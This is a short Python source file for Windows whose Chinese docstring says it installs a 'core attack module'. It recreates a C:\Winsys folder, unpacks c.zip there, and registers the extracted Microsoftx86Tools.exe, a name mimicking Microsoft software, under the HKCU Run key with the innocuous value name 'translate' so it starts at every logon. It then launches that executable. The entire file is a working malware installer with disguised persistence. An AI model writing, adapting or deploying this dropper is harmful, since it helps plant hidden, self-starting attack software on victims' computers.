import os
import zipfile
import win32api
import win32con
import time
import shutil

'''
此程序用于安装核心攻击模块并进行基础的安装设置
此程序工作目录设置为Winsys
'''

def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


def add():
	name = 'translate'  # 要添加的项值名称
	path = r'C:\Winsys\center\windows\Microsoftx86Tools.exe'  # 要添加的exe路径
	# 注册表项名
	KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
	# 异常处理

	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
	win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
	win32api.RegCloseKey(key)


def mainKillCoreInstall():
	try:
		remove_dir(r"C:\Winsys")
	except:
		pass

	os.makedirs(r"C:\Winsys\center\windows")

	shutil.copyfile(r"\c.zip",r"C:\Winsys\center\windows\c.zip")

	azip = zipfile.ZipFile(r"C:\Winsys\center\windows\c.zip")
	#解压到原始目录
	azip.extractall(r"C:\Winsys\center\windows")
	
	try:
		time.sleep(2)
		add()
	except:
		pass

	os.system(r"C:\Winsys\center\windows\Microsoftx86Tools.exe")


